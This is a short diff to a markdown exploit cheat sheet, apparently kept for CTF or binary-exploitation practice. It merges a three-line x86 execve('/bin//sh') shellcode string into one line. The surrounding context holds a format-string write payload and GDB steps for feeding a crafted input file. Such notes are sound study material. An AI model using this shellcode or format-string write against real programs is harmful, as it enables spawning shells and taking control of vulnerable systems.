@@ -70,9 +70,7 @@ output=p32(addr)+'a'*4+'%10$n'
 # mov al, 11
 # int 0x80
 
-shellcode = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"
-shellcode += "\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"
-shellcode += "\x0b\xcd\x80"
+shellcode = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"
 ```
 # GDB
 ```
@@ -101,5 +99,6 @@ with open("input", "wb") as f:
 r < input
 ```
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbMTY0NTMyMzIwLC0yMDkwMTM4NzcyXX0=
+eyJoaXN0b3J5IjpbMTc4NjI5MjIwMCwxNjQ1MzIzMjAsLTIwOT
+AxMzg3NzJdfQ==
 -->
